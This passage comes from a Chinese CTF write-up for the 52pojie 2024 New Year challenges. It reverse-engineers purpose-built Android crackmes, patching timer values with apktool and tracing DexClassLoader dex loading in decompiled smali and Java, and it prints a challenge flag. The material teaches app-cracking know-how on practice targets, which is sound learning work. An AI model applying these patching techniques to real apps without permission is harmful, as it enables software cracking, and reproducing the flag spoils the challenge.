src="https://https://wechat2rss.xlab.app/img-proxy/?k=10e179c3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKOqQr8uUzWQPViaDGNQibOkibCHQRlUiaJWBIYVUHQVgCOpTtQNSGT6mcCw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>分析：</p><ol><li style="margin-left: 2px;"><p>主进程调用Webview运行抓猫游戏<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5725dbbe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKXMn8iaPhnGQuo67qmCW8ia8EXEVzXsZ2wVyw1zd4U73NzfBbUsSlhSKw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>抓住猫以后播放ys.mp4<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0c47aff9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKW25BZ84AHjicbddF0pD0nibOPS7HsMQRlicj17fYkccAEwjMjboEg1TQg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li><li style="margin-left: 2px;"><p>视频播放完以后用SetText显示Flag<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0e2e9398&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKntZYChW5iauzGekxzFYg4wzLas8L1qBEncC99sbsiczD2xKa3wsWqzvg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></li></ol><p>（最后的flag是通过字符操作得到的，没有直接给出，而在该文件中也没有提及具体操作步骤，猜想flag可能藏在那个播放的视频<code style="font-family: SFMono-Regular, Consolas, ;">ys.mp4</code>的文件末尾，因时间原因就不跟下去了）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=d2d10725&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKL7hibVUiaibeV2wMqdKlUNpjYAwribpXxKblElPZHH6qYmTtPUhcPO7YRQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>解题领红包之四 {Android 初级题}</h2><p><span style="font-weight: 700;">寄语：如果不会解题还想拿分那赶紧来现学现卖吧，只要认真看完并动手练习，肯定能解出来本题，吾爱破解安卓逆向入门教程《安卓逆向这档事》。</span></p><h3>游戏</h3><p>第二个小游戏，居然是抽卡<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=776a41d3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKA9Z5KWTZ09Z8ibzbBHibvxUgibJWGRAwdFrp9kz83gIEBIPOY5mwXlrXg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br />（吐槽一句：这0.6%概率真有点低啊......）</p><h3>BUG玩法</h3><p>这个程序没有采用数据库方式，<span style="font-weight: 700;">退出重新进入程序即刷新次数为10次</span><br /><span style="font-weight: 700;">于是乎，“只要我不停地抽，0.6%也不算什么”（doge）</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5b21f93a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKyMfC2fmLPKnmwbRU0KHDC5w6yeJyJo1xibwAFuGsxaQDia9Hq3ppM83A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">Flag：flag{52pj_HappyNewYear2024}</span></p></blockquote><h3>Hacker（破解游戏，调低难度）</h3><p><span style="font-weight: 700;">用英文含义命名Activity是个好习惯，至少对于CM而言是这样</span><br />用apktool反编译apk文件，在程序中，我们又发现了作者的信息<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8ed6a6d0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKH01tfhh3oO4dGjfnwfY6MdRTDUvkuXBJdZzb258xj7mEn8sF9NsiaeQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>各位是否发现增加一抽所需要的时间在不断递增？我们简单修改一下增加一抽所需要时间（修改概率、保底同理，只要修改对应的数值就行了）<br /><span style="font-weight: 700;">将<code style="font-family: Consolas, Monaco, ;">array_1</code>中的数据全部改成0x1（即增加一抽仅需要1s），最坏情况下也只需要90s</span><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4a0d7627&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKWry1aPBwkxoYx2m5S4h0QJw2EsVmV5CnpyMLkNoR3rO033qLP5M0ug%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>修改、编译一气呵成<span style="font-weight: 700;">（注意这时不要签名，因为flag在签名里面）</span>，直接核心破解安装即可，发现此时软件已经变成1秒增加1抽了（doge）</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6973d6f0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKqY4y96BHN5lzljBBdy16djBjrqTbpoia7NMG12UkNXIlJe3X1Q6cg5g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>解题领红包之五 {Android 中级题}</h2><p><span style="font-weight: 700;">题目简介：我，玄天帝，,解封！！！</span></p><h3>游戏</h3><p>emmm，九宫格图形解锁<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=2ba09c7f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKgFoUDWIWUDSQUd8XcqnNLQE03ceSFXuicePGkIxxN8AtvCGbGGRRFfg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>运用强大的搜索引擎，找到了一个类似的开源项目GestureLock</p><p><span style="font-weight: 700;">小知识，安卓系统的图形是以数字密码形式存放在文件中的，所以推断该图形代表的也是一个数字字符串</span></p><h3>静态分析</h3><p>使用jde反编译得到一堆smali文件，打开以作者名字命名的文件夹</p><h4>GestureUnlock本体</h4><p>既然是游戏，那么我们就研究一下这款游戏的本体吧，找到以下定义：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">GestureUnlock</span>(Context context0, AttributeSet attributeSet0, <span style="color: rgb(255, 255, 182);">int</span> v) {<br />        super(context0, attributeSet0, v);<br />        this.cicleRadius = <span style="color: rgb(255, 115, 253);">10</span>;<br />        this.firstInit = <span style="color: rgb(198, 197, 254);">false</span>;<br />        this.points = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>();<br />        this.selectP = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>();<br />        this.alreadyTouch = <span style="color: rgb(198, 197, 254);">false</span>;<br />        this.isUp = <span style="color: rgb(198, 197, 254);">false</span>;<br />        this.lockTouch = <span style="color: rgb(198, 197, 254);">false</span>;<br />        this.returnFun = <span style="color: rgb(255, 115, 253);">0</span>;<br />        this.defaultKey = <span style="color: rgb(168, 255, 96);">"01234"</span>;<br />        this.setUpKey = <span style="color: rgb(168, 255, 96);">""</span>;<br />        this.errorKey = <span style="color: rgb(168, 255, 96);">""</span>;<br />}</code></pre><p>在MainActivity里面也没找到修改密码的Set函数，所以我们试试它的默认密码"01234"<br />嗯，看上去是对了，然后啥都没发生（我的flag呢！</p><p>【注意：此处为GestureUnlock（也就是这个密码锁）的密码，但不是Flag的密码，Flag的密码s在后续会说到】</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=60c3b056&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKOe9ibmcjD15m0QXNicEO5ZCR3FAU0xW7jgjQsoYgXZS9HLSxTODaEsFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>后续分析发现输入该密码时会进入函数<code style="font-family: SFMono-Regular, Consolas, ;">isSuccessful</code>，补充一句该函数是GestureUnlock自带密码正确的回调函数，但此题关键不在此处</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isSuccessful</span>(String s) {<br />    Log.e(<span style="color: rgb(168, 255, 96);">"zj595"</span>, s);<br />}</code></pre><p>而只有输入"错误"的密码才会进入真正的函数isError</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isError</span>(String s) {<br />    Log.e(<span style="color: rgb(168, 255, 96);">"zj595"</span>, s);<br />    MainActivity.this.checkPassword(s); <span style="color: rgb(124, 124, 124);">//checkPassword是个很重要的函数，接下来就会说到</span><br />}</code></pre><h4>解密函数</h4><p>如上部分所述，在MainActivity中提及了一个重要的函数：<code style="font-family: SFMono-Regular, Consolas, ;">checkPassword</code>，先看它的smali code：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">.method</span><span style="color: rgb(150, 203, 254);"> public</span> checkPassword(String)Z<br />          .registers 11<br />00000000  const/4             v0, 0<span style="color: rgb(150, 203, 254);"><br />:try_2</span><br />00000002  invoke-virtual      MainActivity-&gt;getAssets()AssetManager, p0  <span style="color: rgb(124, 124, 124);">#读取Assets中的classes.dex</span><br />00000008  move-result-object  v1<br />0000000A  const-string        v2, <span style="color: rgb(168, 255, 96);">"classes.dex"</span><br />0000000E  invoke-virtual      AssetManager-&gt;open(String)InputStream, v1, v2<br />00000014  move-result-object  v1<br />00000016  invoke-virtual      InputStream-&gt;available()I, v1<br />0000001C  move-result         v2<br />0000001E  new-array           v2, v2, [B<br />00000022  invoke-virtual      InputStream-&gt;read([B)I, v1, v2<br />00000028  new-instance        v3, File<br />0000002C  const-string        v4, <span style="color: rgb(168, 255, 96);">"data"</span><br />00000030  invoke-virtual      MainActivity-&gt;getDir(String, I)File, p0, v4, v0<br />00000036  move-result-object  v4<br />00000038  const-string        v5, <span style="color: rgb(168, 255, 96);">"1.dex"</span><br />0000003C  invoke-direct       File-&gt;&lt;init&gt;(File, String)V, v3, v4, v5<br />00000042  new-instance        v4, FileOutputStream<br />00000046  invoke-direct       FileOutputStream-&gt;&lt;init&gt;(File)V, v4, v3<br />0000004C  invoke-virtual      FileOutputStream-&gt;write([B)V, v4, v2  <span style="color: rgb(124, 124, 124);">#将classes.dex释放至"/data/user/0/com.zj.wuaipojie2024_2/app_data/1.dex"</span><br />00000052  invoke-virtual      FileOutputStream-&gt;close()V, v4<br />00000058  invoke-virtual      InputStream-&gt;close()V, v1<br />0000005E  const-string        v1, <span style="color: rgb(168, 255, 96);">"dex"</span><br />00000062  invoke-virtual      MainActivity-&gt;getDir(String, I)File, p0, v1, v0<br />00000068  move-result-object  v1<br />0000006A  invoke-virtual      Object-&gt;getClass()Class, p0<br />00000070  move-result-object  v2<br />00000072  invoke-virtual      Class-&gt;getClassLoader()ClassLoader, v2<br />00000078  move-result-object  v2<br />0000007A  new-instance        v4, DexClassLoader<br />0000007E  invoke-virtual      File-&gt;getAbsolutePath()String, v3<br />00000084  move-result-object  v3<br />00000086  invoke-virtual      File-&gt;getAbsolutePath()String, v1<br />0000008C  move-result-object  v1<br />0000008E  const/4             v5, 0<br />00000090  invoke-direct       DexClassLoader-&gt;&lt;init&gt;(String, String, String, ClassLoader)V, v4, v3, v1, v5, v2<br />00000096  const-string        v1, <span style="color: rgb(168, 255, 96);">"com.zj.wuaipojie2024_2.C"</span><br />0000009A  invoke-virtual      DexClassLoader-&gt;loadClass(String)Class, v4, v1  <span style="color: rgb(124, 124, 124);"># 加载classes.dex里面的C Activity，和上面的C.smali对应</span><br />000000A0  move-result-object  v1<br />000000A2  const-string        v2, <span style="color: rgb(168, 255, 96);">"isValidate"</span><br />000000A6  const/4             v3, 3<br />000000A8  new-array           v4, v3, [Class<br />000000AC  const-class         v6, Context<br />000000B0  aput-object         v6, v4, v0<br />000000B4  const-class         v6, String<br />000000B8  const/4             v7, 1<br />000000BA  aput-object         v6, v4, v7<br />000000BE  const-class         v6, [I<br />000000C2  const/4             v8, 2<br />000000C4  aput-object         v6, v4, v8<br />000000C8  invoke-virtual      Class-&gt;getDeclaredMethod(String, [Class)Method, v1, v2, v4<br />000000CE  move-result-object  v1<br />000000D0  new-array           v2, v3, [Object<br />000000D4  aput-object         p0, v2, v0<br />000000D8  aput-object         p1, v2, v7<br />000000DC  invoke-virtual      MainActivity-&gt;getResources()Resources, p0  <span style="color: rgb(124, 124, 124);"># actual call site: Landroidx/appcompat/app/AppCompatActivity;-&gt;getResources()Landroid/content/res/Resources;</span><br />000000E2  move-result-object  p1<br />000000E4  sget                v3, R$array-&gt;A_offset:I<br />000000E8  invoke-virtual      Resources-&gt;getIntArray(I)[I, p1, v3  <span style="color: rgb(124, 124, 124);"># 传入Gesture构成的数字数组</span><br />000000EE  move-result-object  p1<br />000000F0  aput-object         p1, v2, v8<br />000000F4  invoke-virtual      Method-&gt;invoke(Object, [Object)Object, v1, v5, v2 <br />000000FA  move-result-object  p1<br />000000FC  check-cast          p1, String<br />00000100  if-eqz              p1,<span style="color: rgb(150, 203, 254);"> :12E</span>              <span style="color: rgb(124, 124, 124);"># 如果比较结果等于0，则跳转12E</span><span style="color: rgb(150, 203, 254);"><br />:104</span><br />00000104  const-string        v1, <span style="color: rgb(168, 255, 96);">"唉!"</span><br />00000108  invoke-virtual      String-&gt;startsWith(String)Z, p1, v1<br />0000010E  move-result         v1<br />00000110  if-eqz              v1,<span style="color: rgb(150, 203, 254);"> :12E</span><span style="color: rgb(150, 203, 254);"><br />:114</span><br />00000114  iget-object         v1, p0, MainActivity-&gt;tvText:TextView<br />00000118  invoke-virtual      TextView-&gt;setText(CharSequence)V, v1, p1<br />0000011E  iget-object         p1, p0, MainActivity-&gt;myunlock:GestureUnlock<br />00000122  const/16            v1, 8<br />00000126  invoke-virtual      GestureUnlock-&gt;setVisibility(I)V, p1, v1<br />          .catch Exception {:try_2 ..<span style="color: rgb(150, 203, 254);"> :tryend_12C</span>}<span style="color: rgb(150, 203, 254);"> :catch_130</span><span style="color: rgb(150, 203, 254);"><br />:tryend_12C</span><br />0000012C  return              v7<span style="color: rgb(150, 203, 254);"><br />:12E</span><br />0000012E  return              v0<span style="color: rgb(150, 203, 254);"><br />:catch_130</span>  <span style="color: rgb(124, 124, 124);"># used for: Ljava/lang/Exception;</span><br />00000130  move-exception      p1<br />00000132  invoke-virtual      Exception-&gt;printStackTrace()V, p1<br />00000138  return              v0<span style="color: rgb(150, 203, 254);"><br />.end method</span></code></pre><p>反编译为java就是：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">MainActivity</span> <span style="color: rgb(150, 203, 254);">extends</span> <span style="color: rgb(255, 255, 182);">AppCompatActivity</span> {<br />    <span style="color: rgb(150, 203, 254);">private</span> GestureUnlock myunlock;<br />    <span style="color: rgb(150, 203, 254);">private</span> TextView tvText;<br /><br />    <span style="color: rgb(150, 203, 254);">static</span> {<br />        System.loadLibrary(<span style="color: rgb(168, 255, 96);">"52pj"</span>);<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(255, 255, 182);">checkPassword</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">InputStream</span> <span style="color: rgb(198, 197, 254);">inputStream0</span> = this.getAssets().open(<span style="color: rgb(168, 255, 96);">"classes.dex"</span>);<br />            <span style="color: rgb(255, 255, 182);">byte</span>[] arr_b = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">byte</span>[inputStream0.available()];<br />            inputStream0.read(arr_b);<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(this.getDir(<span style="color: rgb(168, 255, 96);">"data"</span>, <span style="color: rgb(255, 115, 253);">0</span>), <span style="color: rgb(168, 255, 96);">"1.dex"</span>);<br />            <span style="color: rgb(255, 255, 182);">FileOutputStream</span> <span style="color: rgb(198, 197, 254);">fileOutputStream0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">FileOutputStream</span>(file0);<br />            fileOutputStream0.write(arr_b);<br />            fileOutputStream0.close();<br />            inputStream0.close();<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file1</span> = this.getDir(<span style="color: rgb(168, 255, 96);">"dex"</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(255, 255, 182);">ClassLoader</span> <span style="color: rgb(198, 197, 254);">classLoader0</span> = this.getClass().getClassLoader();<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s1</span> = (String)<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">DexClassLoader</span>(file0.getAbsolutePath(), file1.getAbsolutePath(), <span style="color: rgb(198, 197, 254);">null</span>, classLoader0).loadClass(<span style="color: rgb(168, 255, 96);">"com.zj.wuaipojie2024_2.C"</span>).getDeclaredMethod(<span style="color: rgb(168, 255, 96);">"isValidate"</span>, Context.class, String.class, <span style="color: rgb(255, 255, 182);">int</span>[].class).invoke(<span style="color: rgb(198, 197, 254);">null</span>, this, s, this.getResources().getIntArray(array.A_offset));<br />            <span style="color: rgb(150, 203, 254);">if</span>(s1 != <span style="color: rgb(198, 197, 254);">null</span> &amp;&amp; (s1.startsWith(<span style="color: rgb(168, 255, 96);">"唉!"</span>))) {<br />                this.tvText.setText(s1);<br />                this.myunlock.setVisibility(<span style="color: rgb(255, 115, 253);">8</span>);<br />                <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />            }<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />            exception0.printStackTrace();<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />        }<br /><br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    }<br /><br />    @ Override  <span style="color: rgb(124, 124, 124);">// androidx.fragment.app.FragmentActivity</span><br />    <span style="color: rgb(150, 203, 254);">protected</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">onCreate</span>(Bundle bundle0) {<br />        super.onCreate(bundle0);<br />        this.setContentView(layout.activity_main);<br />        <span style="color: rgb(255, 255, 182);">TextView</span> <span style="color: rgb(198, 197, 254);">textView0</span> = (TextView)this.findViewById(id.tv_text);<br />        this.tvText = textView0;<br />        textView0.setText(<span style="color: rgb(168, 255, 96);">"　　吾名玄天帝，昔为诸界之尊，因古诅咒，沉睡亿载。今幸苏醒，欲召百万神兵仙将，复掌万界，重铸天序。此举，需汝解封印，贡力之源。若助吾破诅归位，赐汝万界神尊，封一神域为土，永居众神之巅。"</span>);<br />        <span style="color: rgb(255, 255, 182);">GestureUnlock</span> <span style="color: rgb(198, 197, 254);">gestureUnlock0</span> = (GestureUnlock)this.findViewById(id.myunlock);<br />        this.myunlock = gestureUnlock0;<br />        gestureUnlock0.setIGestureListener(<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">IGestureListener</span>() {<br />            @ Override  <span style="color: rgb(124, 124, 124);">// com.example.gesturelock.IGestureListener</span><br />            <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isError</span>(String s) {<br />                Log.e(<span style="color: rgb(168, 255, 96);">"zj595"</span>, s);<br />                MainActivity.this.checkPassword(s);<br />            }<br /><br />            @ Override  <span style="color: rgb(124, 124, 124);">// com.example.gesturelock.IGestureListener</span><br />            <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isSetUp</span>(String s) {<br />            }<br /><br />            @ Override  <span style="color: rgb(124, 124, 124);">// com.example.gesturelock.IGestureListener</span><br />            <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">isSuccessful</span>(String s) {<br />                Log.e(<span style="color: rgb(168, 255, 96);">"zj595"</span>, s);<br />            }<br />        });<br />    }<br />}</code></pre><p>程序逻辑还是比较明确的，复制一份classes.dex，命名为1.dex，动态加载dex文件中“com.zj.wuaipojie2024_2.C”类中的“isValidate”函数，传入图形密码字符串，读取返回字符串，如果返回字符串以“诶！”开头，则隐藏密码锁，展示该字符串。</p><p>接下来分析这个“isValidate”函数，同样转为java方便观看</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">isValidate</span>(Context context0, String s, <span style="color: rgb(255, 255, 182);">int</span>[] arr_v) <span style="color: rgb(150, 203, 254);">throws</span> Exception {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">return</span> (String)C.getStaticMethod(context0, arr_v, <span style="color: rgb(168, 255, 96);">"com.zj.wuaipojie2024_2.A"</span>, <span style="color: rgb(168, 255, 96);">"d"</span>, <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Class</span>[]{Context.class, String.class}).invoke(<span style="color: rgb(198, 197, 254);">null</span>, context0, s);<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />            Log.e(<span style="color: rgb(168, 255, 96);">"ZJ595"</span>, <span style="color: rgb(168, 255, 96);">"咦，似乎是坏掉的dex呢！"</span>);<br />            exception0.printStackTrace();<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">""</span>;<br />        }<br />    }</code></pre><p>"isValidate"这个函数调用了同文件下的"getStaticMethod"函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> Method <span style="color: rgb(255, 255, 182);">getStaticMethod</span>(Context context0, <span style="color: rgb(255, 255, 182);">int</span>[] arr_v, String s, String s1, Class[] arr_class) <span style="color: rgb(150, 203, 254);">throws</span> Exception {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = C.fix(C.read(context0), arr_v[<span style="color: rgb(255, 115, 253);">0</span>], arr_v[<span style="color: rgb(255, 115, 253);">1</span>], arr_v[<span style="color: rgb(255, 115, 253);">2</span>], context0);<br />            <span style="color: rgb(255, 255, 182);">ClassLoader</span> <span style="color: rgb(198, 197, 254);">classLoader0</span> = context0.getClass().getClassLoader();<br />            <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file1</span> = context0.getDir(<span style="color: rgb(168, 255, 96);">"fixed"</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />            <span style="color: rgb(255, 255, 182);">Method</span> <span style="color: rgb(198, 197, 254);">method0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">DexClassLoader</span>(file0.getAbsolutePath(), file1.getAbsolutePath(), <span style="color: rgb(198, 197, 254);">null</span>, classLoader0).loadClass(s).getDeclaredMethod(s1, arr_class);<br />            file0.delete();<br />            <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(file1, file0.getName()).delete();<br />            <span style="color: rgb(150, 203, 254);">return</span> method0;<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />            exception0.printStackTrace();<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }</code></pre><p>"getStaticMethod""函数又调用了"fix"函数对dex文件进行修复，生成<code style="font-family: SFMono-Regular, Consolas, ;">2.dex</code>后加载修复后的<code style="font-family: SFMono-Regular, Consolas, ;">com.zj.wuaipojie2024_2.A</code>类中的<code style="font-family: SFMono-Regular, Consolas, ;">d</code>函数至method0，<span style="font-weight: 700;">然后删除生成的<code style="font-family: Consolas, Monaco, ;">2.dex</code>文件后返回（此处为重点）</span></p><p><span style="font-weight: 700;">注：修复前的A类是这样的</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; 